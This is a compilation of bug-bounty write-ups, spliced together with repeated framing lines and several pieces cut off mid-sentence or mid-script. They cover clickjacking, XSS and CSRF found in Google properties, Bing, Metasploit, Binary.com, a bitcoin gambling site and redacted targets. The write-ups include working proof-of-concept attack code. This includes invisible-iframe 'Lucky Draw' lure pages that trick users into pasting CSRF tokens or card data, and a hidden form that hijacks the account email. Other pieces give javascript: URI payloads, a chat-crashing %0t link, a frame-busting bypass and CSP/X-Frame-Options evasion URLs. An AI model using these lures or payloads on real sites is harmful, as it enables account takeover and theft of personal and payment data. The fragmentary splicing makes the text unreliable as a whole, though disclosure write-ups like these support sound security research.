It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nClickjacking DOM XSS on Google.org - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me Clickjacking DOM XSS on Google.org by Thomas Orlita Vulnerabilities August 12, 2019 June 10, 2022 One of the lesser-known Google projects is Google Crisis Map . It was created to help people find and use critical emergency information. [source] Although it is still working, it doesn’t seem to be used much anymore. Since it’s an older project (created in 2012) and not updated often, it’s a great target to look for vulnerabilities. It’s hosted on the google.org domain, which doesn’t have as big a severity as google.com (for client-side vulnerabilities), but it’s still a domain owned by Google. Logging in If you go to the project’s home page ( google.org/crisismap ), you’ll get redirected to the default map “Weather and Events”. This isn’t very interesting for us since the only thing we can do is view the map. There is a way to manage and create new maps. It can be accessed if we add .maps at the end of the URL: google.org/crisismap/.maps Once you open this page, you’ll need to log in with your Google account to continue. Now you should see a dashboard with a list of maps. There are three default maps for every account. For some reason, if you publish one of these maps on your own domain, everyone will see that in the dashboard under the “Published Map” field. Creating a map If you click on the red “Create Map” button, you’ll most likely see a message that the gmail.com domain can’t be used for creating new maps. This means we need to log in using an email with our custom domain. We can do this either by logging in with a GSuite account or an email that uses a domain other than gmail.com. After that, we can create a new map. After clicking the “Continue” button, we’ll get redirected to a page where we can edit the newly created map. Finding the XSS First, we’ll add a new layer to the map. A dialog for creating a new layer will pop up. We’ll enter anything as the “Title”. Now if we enter javascript:alert(document.domain) into the “Source URL” field, it’ll show an error: Invalid URL – please include a protocol (e.g. http:// or https://) This means it checks if the URL is valid before it allows you to save the new layer. The deobfuscated JavaScript code that validates the URL looks like this: if (url && !url.toLowerCase().match(\"^\\\\s*(http://|https://|docs://|$)\")) { showError(\"Invalid URL - please include a protocol (e.g. http:// or https://)\"); } But this is only validation on the client-side before the actual save request is sent to the backend. Modifying the request We can use a web debugging proxy like Fiddler or Burp Suite to modify the request and send the modified version instead. First, we need to change the “Source URL” to a valid URL, e.g. https://example.com . We’ll click the “OK” button and click “Save” to send the save request. Then we’ll modify the request. This is what the request looks like: POST https://google.org/crisismap/.api/maps/1234 { \"id\": \"1234\", \"title\": \"Untitled map\", \"base_map_type\": \"GOOGLE_ROADMAP\", \"layers\": [{ \"id\": \"1\", \"title\": \"Test layer\", \"visibility\": \"DEFAULT_ON\", \"type\": \"KML\", \"source\": { \"kml\": { \"url\": \"https://example.com\" } } }] } We’ll replace https://example.com with javascript:alert(document.domain) and send this modified request. Testing the XSS The request is now sent and saved, so we’ll reload the page. Open “Layers” and click on “Download KML”. After we click on the download link, the XSS is fired and the alert box pops up with the domain name! How to fix this Why did this happen? The URL validation happened only on the frontend and not in the backend. That means this could be fixed by validating the URL in the backend as well. But this is not the way Google decided to fix it. Instead of checking the URL when saving it in the backend, the URL is now validated before displaying in the DOM. So if the URL isn’t valid, it won’t be used as the link. It’ll use a meaningless value like about:invalid instead. <a href=\"about:invalid#zClosurez\">Download KML</a> The impact Okay, so we have a link that points to a javascript: URI containing the payload. The link is on a page to manage the map. And you must log in and have permission to access the page. Clearly, this is self-XSS since only we are able to get this XSS executed. Now how do we get from self-XSS to a real XSS? Increasing the severity Every map we create can be published to be viewed by the public. If you’re logged in via an email with the domain example.com , you can publish the map to the URL https://google.org/crisismap/example.com/test . Anyone can open this URL and view the map we’ve created. To get the XSS working, the user would have to open or be navigated to this page, open the “Layers” view and then click the “Download KML” link. This means it’d no longer be self-XSS, but it’s still too many steps the user would have to make for this XSS to be useful. Clickjacking If we take a look at the response HTTP headers, we can see that google.org doesn’t send the X-Frame-Options header. Response headers from google.org Response headers from google.com The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> , <iframe> , <embed> or <object> . Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites. — MDN web docs The (intentional) lack of this HTTP header on google.org means we can embed the published map into an iframe on our own website. <iframe src=\"https://google.org/crisismap/example.com/test\"></iframe> This is how it’ll look like. In order to fire the XSS the user now doesn’t have to even leave our website. But they’d still need to click on two places in the iframe (“ Layers ” > “ Download KML “). The iframe is loaded on our website – that means we can use CSS and JavaScript to manipulate it. The first thing that came to my mind was to put black DIVs around the point where we want the user to click. Then detect a click and move the DIV to the second point. This worked well but it still requires the user to click on two different locations. But a more efficient solution would be to position the iframe absolutely with CSS so the user doesn’t have to move the cursor at all. Below is was a live demo. Unfortunately, Google Crisis Map has been discontinued so the live demo won’t work anymore. You can see how it looked like in the video . It scales the iframe 50× and moves it to the position we want the user to click. First to the “Layers” tab. After a click, it moves over the link with the payload. It was possible to execute the XSS by clicking two times somewhere in the iframe . We could even overlay the iframe with an opaque div with pointer-events disabled, so the user would have no idea they are clicking in the iframe. For the sake of the sample and the fact that this vulnerability is already fixed, the link goes to https:// and not javascript: URI. Conclusions There are several things to be taken from here. Never trust user input. Always check (on the backend) if it’s valid before saving it. Make sure to properly sanitize it depending on the context it will be in. Don’t allow other domains to embed your website in an iframe by correctly setting the X-Frame-Options header. When looking for vulnerabilities, try to find the highest possible severity of the vulnerability. For example, if you find an XSS, try making it into an account takeover by finding incorrectly configured cookies or endpoints. Don’t be afraid to look for older projects that still fit into the scope of the Bug Bounty program.

It was a private program on Bugcrowd. The Profile page of the site allows the user to change their email and there was no X-Frame Header on that page so the profile page can be loaded in an iframe. The profile page URL was http://example.com/mi-cuenta/mi-perfil/ the page contains a form with an email field which was prefilled with the current email, so out of curiosity I just added an email parameter in the URL to check if the specified email in the parameter is being inputted in the email field and yes it worked. http://example.com/mi-cuenta/mi-perfil?email=hacked@gmail.com Press enter or click to view image in full size Now everything was set up, I just needed to load this URL in an iframe and make the user click on the Update button to change their email. So I created an HTML page for that to trick user into clicking that Update button. Press enter or click to view image in full size I loaded the URL in an iframe and created a <div> tag with the text Click here and positioned it above the Update button, so now when the User will click on Click here the Update button below it will be clicked. Which will change the User Email. Press enter or click to view image in full size This is the final look after setting the iframe opacity to 0, so now after clicking on the Click here text User email will be changed, and I can request a new password for the account with that email. So that is it, Always try to look for opportunities, even small vulnerabilities can have a larger impact, Thanks for Reading.

Baset comment 2 Comments access_time 6 min read Hi Guys, I hope you all are fine and doing well. Yes you read it right, We managed to find a vulnerability in a framework used to exploit vulnerabilities! “Today is me tomorrow will be you” 🙂 Today we will talk about a CSRF vulnerability affects the web application of both versions (Express, Community and Professional) of Metasploit Project. But first what is Metasploit? (Seriously maybe somebody out there don’t know about it yet :D) The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. Its best-known sub-project is the open source Metasploit Framework, a tool for developing and executing exploit code against a remote target machine. Other important sub-projects include the Opcode Database, shellcode archive and related research. The Metasploit Project is well known for its anti-forensic and evasion tools, some of which are built into the Metasploit Framework. Metasploit was created by H. D. Moore in 2003 as a portable network tool using Perl. By 2007, the Metasploit Framework had been completely rewritten in Ruby. On October 21, 2009, the Metasploit Project announced that it had been acquired by Rapid7, a security company that provides unified vulnerability management solutions. Like comparable commercial products such as Immunity’s Canvas or Core Security Technologies’ Core Impact, Metasploit can be used to test the vulnerability of computer systems or to break into remote systems. Like many information security tools, Metasploit can be used for both legitimate and unauthorized activities. Since the acquisition of the Metasploit Framework, Rapid7 has added two open core proprietary editions called Metasploit Express and Metasploit Pro. Metasploit’s emerging position as the de facto exploit development framework led to the release of software vulnerability advisories often accompanied by a third party Metasploit exploit module that highlights the exploitability, risk and remediation of that particular bug. Metasploit 3.0 began to include fuzzing tools, used to discover software vulnerabilities, rather than just exploits for known bugs. This avenue can be seen with the integration of the lorcon wireless (802.11) toolset into Metasploit 3.0 in November 2006. Metasploit 4.0 was released in August 2011. This CSRF vulnerability can be used to perform an attack against all the running “Scans and Tasks” by metasploit project. When we discovered this issue we’ve called it “The metasploit firewall”, So funny isn’t it! But why? If you hosted a page with the blew proof of concept code on your local/ web server index you will be tricking Metasploit scanning session to load this page (of course to scan it) hence kill all the running tasks. A firewall? hmmm kind of! ( Update : We thought it might be a valid attack vector but after some investigations it turned to be not because the crawler used by metasploit is not authenticated with the metasploit session itself) Usability issue : There have to be an option to resume the stopped tasks to not to lose it at all after performing such attack. Metasploit team comment about the issue: CVE-2017-5244 (CWE-352: Cross-Site Request Forgery): Metasploit commercial editions allowed GET requests to the stop and stop_all (task) routes. This should not have been the case, as they change the state of the service, and should have been only allowed through POST requests. In addition, the origin of the requests was not verified until after processing. This could have allowed an attacker to stop one, or all, Metasploit tasks by getting an authenticated user to run JavaScript (e.g. via loading a malicious URL). Now the routes are only exposed to POST requests, which validate the presence of a secret token to prevent CSRF attacks (via Rails’ protect_from_forgery). This vulnerability was kindly reported to Rapid7 by Mohamed A. Baset (Founder and Cyber Security Advisor at Seekurity.com SAS de C.V. Mexico; @SymbianSyMoh). Rapid7 made a public advisory with more technical details you can read about it here: https://community.rapid7.com/community/metasploit/blog/2017/06/14/r7-2017-16-cve-2017-5244-lack-of-csrf-protection-for-stopping-tasks-in-metasploit-pro-express-and-community-editions-fixed And here is our advisory details: # Exploit Title: Metasploit Web Project Kill all running tasks CSRF # Date reported: 27-5-2017 # Exploit Author: Seekurity SAS de C.V. – Mohamed Abdelbasset Elnouby (@SymbianSyMoh) # Vendor Homepage: http://www.metasploit.com/ # Software Link: https://www.rapid7.com/products/metasploit/download/editions/ # Affected Versions: Express, Community and Pro < 4.14.0 (Update 2017051801) # CVE number: CVE-2017-5244 Vulnerability: Cross Site Request Forgery – (CSRF) / Improper Anti-CSRF token validation Vulnerability reference : http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) Video PoC: Impact: After doing some research, i have found that the anti csrf token “authenticity_token” value is not validated from the local server side which will result in a csrf attack and kills all the currently running metasploit tasks (with no ability to resume). Attack vectors: Attackers can target a local metasploit user and use the PoC code to stop/kill all the running metasploit tasks, or by other MITM tricks like injecting the PoC code into the network traffic which will cause the same exact impact.

And they reward me 7,500$ for single bug. Amazing, right?. This bug I’ve found on March 2018, but the clickjacking is just blocked by CSP, and on August, I’ve found way to bypass it. Actually, I’ve been research on business.google.com subdomain and look around, just dummies touching the feature. See the respond and request. Try a stupid thing, edit the parameter, etc. And when I want to manage the user is redirect me to myaccount.google.com which is place where I found the bug. I look at my Lovely Community Edition of Burp Suite, There’s no header X-Frame-Option on it. At that time, I use Firefox ESR, I craft simple html just to iframe the page. And success, report them, but not applicable. Because on Firefox Quantum, Say Blocked By CSP, Clickjacking Blocked By CSP on Modern Browser Sad to hear that, but I realize I just too noob. So, It’s okay. I leave my research on google until August 15th. I try to look around again on my previous research. With more focus and of course my black coffee. I try to understand the code work. I realize if the CSP rule is reflected from my request parameter. I found it on business.google.com , so the parameter of the host is business.google.com. URL : https://myaccount.google.com/u/0/brandaccounts/group/101656179839819660704/managers?originProduct=AC&origin=https://business.google.com And the respond is : I realize if host just accept from business.google.com on origin parameter. So, I think the only way to execute it just from business.google.com . But, I try to edit parameter the origin to https://akugalau.business.google.com . It’s accepted! But, It’s impossible to use that subdomain. Hmmmm, Okay, The csp still here, And I can’t do nothing, right? Do, I must give up? Come on, It’s a big company and I ? Just little kid with the broken heart story 🙁 SAD! But, I have a lot free time to do stupid thing, right? So, I just adding illegal character on the origin parameter. I try to put URL Encode before the business.google.com. Become like this : https://myaccount.google.com/u/0/brandaccounts/group/101656179839819660704/managers?originProduct=AC&origin=https://%0d.business.google.com And the CSP is disappear , w000tttttt!!!!?!@?#!@?3!@?3? I try to iframe that And, I success to perform the clickjacking :’ . My condition is between not believe this and happy. If you ask me where the logic from adding the url encode on that. I dont understand :’ , I just lucky kid. I make report quickly and submit to google. After 1 month, I just expected it’s worth 3,133.7 or 5,000. But, the google give me bigger bounty, they give me 7,500$ . What ! I dont know what i suppose to say. :’ , I dont believe it because I just noob kid. PoC Code : <iframe src=” https://myaccount.google.com/u/0/brandaccounts/group/{your-group-id}/managers?originProduct=AC&origin=https://%0d.business.google.com ” width=”1000″ height=”1000″> Attack Scenario : 1. Admin invite new user on group-id 2. New user will accept the invitation 3. New user know the {your-group-id} 4.

Let’s assume the website name is redacted.com So when I visited the profile page https://redacted.com/editinfo/ & tried to change the account details there was a CSRF token I tried different methods to bypass that CSRF protection but failed, then I found the suspicious endpoint that was disclosing the CSRF token https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/ So when I opened that endpoint I found the CSRF token in the response, Now the next part was to steal the CSRF token & then I found out that there was no protection from the click jacking I created an HTML + JS Script to exploit the CSRF in just 1 Click <!DOCTYPE html> <html> <head> <title></title> </head> <body> <center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win a $100</h1></center> <h3>Click inside the box and Press CTRL+A then CTRL+C</h3> <div style=”border: 2px solid gray;”> <iframe src=” https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/ \" width=”100%” style=”opacity: 0\"></iframe> </div> <h3>Click inside the box and press CTRL+V</h3> <input type=”password” name=”” size=”1\"> <br> <button id=”btn”>Click to Win</button> <div style=”display: none;”> <form action=”” method=”POST”> <input type=”hidden” name=”addrid” value=”12741305\" /> <input type=”hidden” name=”uname” value=” hack@gmail.com ” /> <input type=”hidden” name=”issendmsg” value=”1\" /> <input type=”hidden” name=”display” value=”” /> <input type=”hidden” name=”sendtype” value=”update” /> <input type=”hidden” name=”firstname” value=”accountinfo” /> <input type=”hidden” name=”lastname” value=”HACKED” /> <input type=”hidden” name=”country” value=”US” /> <input type=”hidden” name=”reglang” value=”en&#95;US” /> <input type=”hidden” name=”postcode” value=”1337\" /> <input type=”submit” value=”Submit request” /> </form> </div> </body> <script> document.querySelector(“#btn”).onclick = function() { var token = document.querySelector(“input”).value var form = document.querySelector(“form”) token = JSON.parse(token) var mapInput = document.createElement(“input”); mapInput.type = “hidden”; mapInput.name = “auth_token”; mapInput.value = token.Value; form.appendChild(mapInput) form.action = ` https://redacted.com/editInfo` form.submit(); alert(“Congratulation!

So there were some API endpoints, which were disclosing User Information like Credit Card Data, Email, Name, Phone, Address, User Id, etc. https://example.com/api/v1/wallet/payments?language=en https://example.com/api/v1/profile/personal https://example.com/api/v1/wallet/address/shipping https://www.example.com/no-cache/profileSystem/getProfile Now as there was no X-FRAME Header on any of these endpoints so I was able to load them in an IFRAME. Now I had to create an HTML page to trick the user into stealing their Information. So I created an HTML page. Press enter or click to view image in full size HTML CODE <!DOCTYPE html> <html> <head> <title></title> </head> <body> <div id=”parent”> <center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win $100</h1></center> <h3>Click inside the box and Press CTRL+A then CTRL+C</h3> <div style=”border: 2px solid gray;”> <iframe src=”https://example.com/api/v1/wallet/payments?language=en\" width=”100%” style=”opacity: 0.01\"></iframe> </div> <h3>Click inside the box and press CTRL+V</h3> <input type=”password” name=”” size=”1\"> <! — <textarea rows=”1\" cols=”1\" style=”resize: none;”></textarea> → <br> <button id=”btn”>Click to Win</button> </div> </body> <script> document.querySelector(“#btn”).onclick = function() { console.log(document.querySelector(“input”).value) alert(“Congratulation!

I would love to get an invite. Please get in touch with me: ameerassadime[at]gmail[.]com Introduction: Modern Web Applications nowadays are relaying on a lot of technologies where typical web applications vulnerabilities are hard to find (eg. Clickjacking is an ABC security bug) but bug hunters are always the best! Binary.com is one of the oldest and most respected names in online binary trading, Using Binary.com, customers can trade currencies, indices, stocks and commodities 24/7. Binary.com is owned and operated by the Binary Ltd. group of companies. In the UK and Isle of Man, clients trade through Binary (IOM) Ltd. In the European Union (except UK), they trade through Binary (Europe) Ltd and Binary Investments (Europe) Ltd. In the rest of the world, they trade through Binary (C.R.) S.A. The bug: While Doing Pentesting/BugHunting I aslo love to test subdomains not only the mine site so i started testing ticktrade.binary.com subdomain and found that’s not protected against clickjacking vulnerability neither with the typical “X-Frame-Options” nor with the JS frame busting technique that means a malicious attacker capable of iframing the whole service and tricking the end-users to perform unwanted actions! So I have Reported this vulnerability to Binary.com with this PoC: <html> <body> <iframe src=\"https://ticktrade.binary.com/\" width=600 height=400> <p>Your browser does not support iframes.</p> </iframe> </body> </html> then i got this reply from security team in the same day and after two day’s i received reply that the issue has been fixed. i’m always love to bypass the resolved issue, now comes the fun bit. i started looking how the security team fixed this vulnerability i mean if the vulnerability patched by adding X-Frame-Options or using JS frame busting technique and got it, the team uses JS frame busting technique to patch this vulnerability so let’s see how i bypassed this patch by Exploiting HTML5 Security Features Sandboxed Iframes What is Sandboxed iframes? The sandbox attribute enables an extra set of restrictions for the content in the iframe. When the sandbox attribute is present, and it will: Treat the content as being from a unique origin Block form submission block script execution Disable APIs Prevent links from targeting other browsing contexts Prevent content from using plugins through <embed>, <object>, <applet> , or other Prevent the content to navigate its top-level browsing context Block automatically triggered features (such as automatically playing a video or automatically focusing a form control) Attack Scenario : Iframing the Settings page or any other sensitive page with a sandboxed iframe to prevent redirecting to top window and allow scripts to be running, fooling the users to do unwanted actions. the final bypassing PoC: <html> <body> <iframe sandbox=\"allow-modals allow-scripts allow-forms allow-popups allow-same-origin\" src=\"http://ticktrade.binary.com\" width=600 height=400> <p>Bypassed By @AmeerAssadi.</p> </iframe> </body> </html> Reward: Binary Security Team rewarded me with a bounty and added my name on there Hall of Fame page , Thanks Binary!

I wrote an exploit code for clickjacking and here is the exploit code: <center> <div style=\"position: absolute; left: 100px; top: 10px;\"><h3>Let's consider this is a game!</h3></div> <div style=\"position: absolute; left: 100px; top: 40px;\"><h3>To finish it, you have to press the keys in sequence.</h3></div> <div style=\"position: absolute; left: 205px; top: 278px; color: red;\"><button>1</button></div> <div style=\"position: absolute; left: 300px; top: 178px; color: red;\"><button>2</button></div> <div style=\"position: absolute; left: 400px; top: 475px; color: red;\"><button>3</button></div> <iframe style=\"opacity: 1; border: 0; position: fixed; top: 0px; left: 0px;\" src=\"https://cse.google.com/\" width=\"100%\" height=\"100%\"></iframe> By using Clickjacking technique, an attacker can make someone unconsciously delete their CSE. About how attacker can make someone unconsciously delete their CSE, you can check my video POC here: Enough about the explanation. Okay, the problem has just begun. My findings above, in my opinion are valid bugs. Why? Because the attacker can delete someone’s data (CSE), isn’t this a bug? But the response I got was very surprising. Press enter or click to view image in full size Press enter or click to view image in full size The part that makes me confused is, how is this not a bug? Because in my head it is clear that I can delete other people’s data. What do you think? Is this a bug? Or is it just me who overestimates this as a bug? This article already published in dev.to .

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe $12,000 Intersection between Clickjacking, XSS, and Denial of Service ‹ Back Introduction \"Digging Deep\" into Chat: Denial of Service against User Clients - $2,000 bounty What about pasting links to the same domain? Some time later... How could this be weaponized? \"Digging Deep\" into Chat: XSS plus Click Jacking - $10,000 bounty Conclusion ‹ Back The $12,000 Intersection between Clickjacking, XSS, and Denial of Service Wed Jul 04 2018 One of the more challenging tasks in web app pentesting is approaching an application that has limited interaction. It's very easy to give up after trying every common method to exploit something, but putting in the time to understand an application is often rewarding and beneficial to ones personal growth as a hacker. Introduction The specific application that I've been targeting over the last few weeks is a bitcoin gambling website where a stock will progressively rise over time. The gambler decides the amount of money they would like to put in and a multiplier to payout at. As the multiplier goes up, they have an option to click a button and receive whatever returns they had made it to. Each time the multiplier goes up, there is a chance the stock will \"bust\" and all of the investment will be lost. The application had a few really interesting functionalities, but the one I really wanted to spend time on was the ability to chat with other users. \"Digging Deep\" into Chat: Denial of Service against User Clients - $2,000 bounty One of the things that I had identified after scrolling through the chat messages was that the service auto-created hyperlinks when a link was pasted. This was interesting since the website made a really special HTML element that is oftentimes dangerously implemented so that an attacker could do one of the following... < a href = \":1\" > :2 </ a > \" onmouseover=alert(1) a=\" - this would fire at :1 if not sanitized properly javascript:alert(1) - this would fire at :1 if not sanitized properly <script>alert(1)</script> - this would fire at :2 if not sanitized properly Sadly, none of these worked. It appeared that the service did not hyperlink the external endpoints directly, but modified it to the following endpoint where www.google.com would be an example posted URL... https://www.bustabit.com/external?url=https://www.google.com ...the result of posting a URL... ... the page that you're taken to after clicking said URL. What about pasting links to the same domain? We'll come back to the above endpoint shortly, but something interesting about the external forwarding service was that it did not forward URLs for the same domain. There was some sort of detection mechanism for determining if a URL was from the same site, e.g. www.bustabit.com/a would not trigger the domain to be modified to www.bustabit.com/external?url=www.bustabit.com/a since it was on the same domain. Here is the generated HTML for www.bustabit.com/a ... < a href = \"/a\" > www.bustabit.com/a </ a > ... compared to the generated HTML for www.google.com/a ... < a href = \"https://www.bustabit.com/external?url=https://www.google.com/a\" > https://www.google.com/a </ a > The really cool part about the above URL is that it's not hyperlinking the full domain, but simply the endpoint. What an attacker could potentially do here is abuse the functionality of double slashes for external resources using a payload like... https://www.bustabit.com//attacker.com/hacked ... to create ... < a href = \"//attacker.com/hacked\" > www.bustabit.com//attacker.com/hacked </ a > This worked! The following HTML is the exact same hyperlink above: //hacker.com/ Notice how it takes you to an external resource and not an endpoint on samcurry.net ? More information on this is available here: http://www.ietf.org/rfc/rfc2396.txt . This WOULD'VE WORKED as a bypass to the link filter, but this was an all-JavaScript application that was doing an onclick event to load the endpoint in the same tab since the domain was the exact same and it didn't have to refresh whatsoever. Damn! It's incredibly frustrating seeing your PoC HTML written in the client, hovering over a hyperlink with a link to whywontyouload.com , then clicking it and nothing happening. After investigating this for a bit I got really annoyed and worked to identify what exactly was happening when I clicked the URL. Some time later... After a long time endlessly spamming random payloads and attempting to find something that would take a user to an external domain, the website went gray. It turns out that I had actually broken my client by sending https://www.bustabit.com/%0t . The JavaScript didn't know how to handle this since the URL encoding for %0t did not decode to anything and simply failed the entire application (see here for more information regarding correct URL encoding). After refreshing the page I was amazed: my client was still broken. It turns out that the application pushed all hyperlinks to a JavaScript function automatically, and if there was a failed URL (e.g. had %0t ), the application would crash. How could this be weaponized? An attacker could direct message anyone placing a bet (this is public information - all live bets and wagers are in the upper right box) and it would crash the victims client, making them unable to cash out their bet. Additionally, an attacker could simply post a bad link to the main chat channel and disconnect everyone, making the game unplayable for a long period of time or cancelling the ability to interact for all users. \"Digging Deep\" into Chat: XSS plus Click Jacking - $10,000 bounty Remember that external endpoint I had posted above? It turns out that you could simply pass it a JavaScript URI and an attacker could execute JavaScript within the context of the application. These bugs always suck because they require you to convince someone to click something. One of the things you can do to make these PoCs better is to simply check if the website can be put inside of an <iframe> tag. If this is possible, then it would additionally be possible to create a clickjacking PoC using something like Samy Kamkar's quick jacking PoC generation tool . It turns out that the service was able to be placed inside of an <iframe> . With this, I generated an example PoC using that awesome little snippet of Click here to continue . Which, in a real world scenario, could look a little something like this... So, what can you do with XSS? Session takeover! It turns out that the web sockets session is stored within the local storage of your browser. An attacker could abuse the XSS to force the victim into making a call to an external service with their session information. An attacker could authenticate to the application by modifying their own secrets to the victims and authenticating to the service. Conclusion More often than not I see people approaching bug bounty with a very \"spray everything lightly\" methodology. This will probably work eventually, but the thing you have to keep in mind is that every one can download automated tools like aquatone or dirsearch. If you want to find vulnerabilities on things where there are thousands of other researchers, it is often your best bet to dig deep on certain functionalities.

(XSS and CSRF in Bing) Sai Krishna Kothapalli 3 min read · Jun 10, 2016 -- 1 Listen Share Hello !! This post will be about my 4th and 5th valid bug reports I submitted to Microsoft. Open the Images in a new tab if you find them difficult to view. I took the screenshots in a 1080p screen. This time I have found a XSS and CSRF vulnerabilities in Bing . Bing images is testing 3 new features called Stream , Favorites , Trending which are still in beta. Bing Images So I was going through this and there is this option where you can search and directly add images to your favourites. It was cool, So I wanted to take a look at how it is implemented. When you click on the heart symbol after the image search, the image is added to your favourites. and the request looks like this It’s URL-Encoded. Once decoded it looks like this {“WriteNewCollection”:true,”query”:”lucianazogbi”,”mid”:”5689B0BFCDB0E64E595A3B6C2B7A0865A4DC236C”,”description”:”lucianazogbi”,”MediaUrl”:”https://beautifulgeniuses.files.wordpress.com/2015/01/lucianazogbi.jpg&#8221;,”SourceUrl”:”http://beautifulgeniuses.com/2015/01/14/lucianazogbi/&#8221;,”ThWidth”:300,”ThHeight”:300,”MediaWidth”:640,”MediaHeight”:640,”MD5″:”md5_5c6aa5d2768f0d2255dab627015da340″,”MediaFormat”:””,”ThumbnailId”:“OIP.M5c6aa5d2768f0d2255dab627015da340o2″,”CollectionType”:0,”ContentId”:”XGql0naP”} Interesting there is no CSRF token and there is no X-Requested-With : XMLHttpRequest header. Which means it is vulnerable to CSRF attacks. Another interesting thing is the webpage is displaying this data in the Favorites tab. Then why not try to inject some JavaScript there. I tried all the fields but none of them worked. When I almost gave hope I saw this. This link is vulnerable to XSS . It is accepting links javascript:code in the <a> href tag . So when I click on it. BAMN Our favourite popup. So, by sending the user to a single malicious site it is possible to compromise his account. If I have stopped after the CSRF I would have not found the XSS. So, by successfully combining 2 vulnerabilities we made an exploit to compromise Bing. I reported this to Microsoft and now it is fixed. Since, that feature is still in beta-testing they took more than 5 months to fix that in order to make it more secure. My name will be in the March 2016 Hall Of Fame. Thank you for reading.

Clickjacking is one of the lowest paid, mostly out of the scope and underestimated vulnerability by organisations. What is Clickjacking ? Unknowingly performing some sensitive actions on a webpage embedded(mostly in iframes) in any webpage with different or same domain/subdomain. A. Clickjacking in Google’s play store payment page. 5000$ Steps to reproduce: 1. Attack url is is https://play.google.com/store/epurchase?dp=null&hl=en&docId=subs:com.google.android.apps.docs:r1.100gb&usegapi=1&id=I2_1505755312332&parent=https://www.google.com 2. When we add this url to <iframe src >there is an csp error : “Refused to display ‘ https://play.google.com/store/epurchase?dp=null&hl=en&docId=subs:com.google ….docs:r1.100gb&usegapi=1&id=I2_1505755312332&parent= https://www.google.com ' in a frame because an ancestor violates the following Content Security Policy directive: “frame-ancestors ‘self’ https://*. google.com https://*. googleusercontent.com https://editionsatplay.withgoogle.com https://livecase.withgoogle.com \".\" 3. But “*. google.com ” is allowed. 4. Go to play.google.com and add some amount > 200 INR using google play recharge code. 5. Go to sites.google.com and create new site, there is an iframe option to insert. add URL given in step 1 to iframe src. 6. For POC i have included it in ( https://sites.google.com/site/conceptofmathematicsnow/ ). The page get embedded . Just by one click on subscribe ,amount (130 rs ) will get deducted and you will get subscribed to 100gb drive unknowingly. Attack scenario: Clickjacking on page lead to deduct amount from google play wallet and subscribe user to google drive upgrade 1.) Attacker will embed “ https://play.google.com/store/epurchase?dp=null&hl=en&docId=subs:com.google.android.apps.docs:r1.100gb&usegapi=1&id=I2_1505755312332&parent=https://www.google.com \" in any sites.google.com site like “ https://sites.google.com/site/conceptofmathematicsnow/ \" (here we can add javascript plugins) 2.) When user visit https://sites.google.com/site/conceptofmathematicsnow/ , and unknowingly click just one button (subscribe).Money will get deducted and he will be subscribed. Press enter or click to view image in full size B. Clickjacking in https://payments.google.com/ using google’s open redirection vulnerability. 3133.7 $ Steps to reproduce: 1. <iframe height=”1200px” width=”1200px” src=” https://www.google.com/url?sa=D&q=https://payments.google.com/payments&usg=AFQjCNGnO25JhaC9l_zIK-Is46SusuQRsQ \"></iframe> 2. The url in iframe src , will make “ https://www.google.com/url \" as a referer to payments.google.com page. 3. Once there is valid referer , the X-Frame-Options Header Vanishes Browser/OS: Chrome / Firefox Attack scenario: It’s making whole payments.google.com pages/tabs clickjackable. With few user interactions 1.) Attacker can close victim’s payment account 2.) Can add his account to manage victim’s account. 3.) Can Change payment profile details C. Clickjacking in https://docs.google.com/picker . 1337$ Steps to reproduce: 1. Go to youtube there is upload button and “Import your videos from Google Photos” , On clicking this video picker will open and url for the same is : https://docs.google.com/picker?protocol=gadgets&origin=https%3A%2F%2Fwww.youtube.com&hostId=yt-upload-importer&hl=en_GB&title&actions=picked%2Ccancel%2Cloaded%2Creceived%2CviewContentRendered&mineOnly=true&multiselectEnabled=true&shadeDialog=true&horizNav=true&maxItems=300&relayUrl=https%3A%2F%2Fwww.youtube.com%2F%2Fs.ytimg.com%2Fyts%2Ffavicon-vflz7uhzw.ico&pp=%5B%5B%22album%22%2C%7B%7D%5D%5D&nav=((%22photos%22%2C%22All%20Videos%22%2C%7B%22type%22%3A%22videos-uploaded%22%2C%22svm%22%3Atrue%2C%22rdv%22%3Atrue%7D)%2C(%22photos%22%2C%22Auto%20Backup%22%2C%7B%22type%22%3A%22videos-camerasync%22%2C%22svm%22%3Atrue%7D)%2C(%22photos%22%2C%22Albums%22%2C%7B%22selectAlbum%22%3Atrue%7D))&rpctoken=tppfn9l0d0ug&rpcService=40cmfpboj50i 2. A.) There is a request parameter origin= https://www.youtube.com and response header x-frame-options:ALLOW-FROM https://www.youtube.com B.) When we set origin= https://anything.com , there will be error page and x-frame-options: https://anything.com C.) When we set origin= https://sites.google.com , there will be error page and x-frame-options: https://sites.google.com D.)When we set origin= https://beta.sites.google.com , PICKER appears and NO error page and x-frame-options: https://beta.sites.google.com in response header same is the case for https://googledrive.com This means we can embed the video picker on https://beta.sites.google.com . E.) https://beta.sites.google.com/site/conceptofmathematicsnow/ : here i have uploaded the same in iframe. https://beta.sites.google.com/site/conceptofmathematicsnow/ Browser/OS: Firefox, Chrome Attack scenario: Clickjacking the button can convert user’s private/public videos to public on youtube Press enter or click to view image in full size D. Clickjacking in Google Sites(New) Setting Page. 1337$ Clickjacking Lead to deleting the google sites (trashed) Steps to reproduce: 1. As X-FRAME OPTIONS https://sites.google.com/new?usp=jotspot_si is Same-Origin , So the page can be embedded in my https://sites.google.com/site/conceptofmathematicsnow/ 2. Page is embedded to https://sites.google.com/site/conceptofmathematicsnow/ Browser/OS: Firefox/Chrome Attack scenario: 1.) Page contains some sensitive actions like : DELETING THE PAGE, RENAMING THE PAGE. E. Clickjacking in Google’ site error page. 1337$ Steps to reproduce: 1. Create a Google site (new).Embed iframe with src=” https://sites.google.com/site/sites/_/.%2F..%2f/..%2F/etc/passwd \" 2. Open a new browser, log in to Gmail and sites.google.com . 3. In another tab open the site created in 1.( https://sites.google.com/view/raushannewtest ). As the user is login. There is an option to change public profile pic (from albums, private photos inside google drive.Also user can upload from the system and set it as a profile pic)inside the iframe. 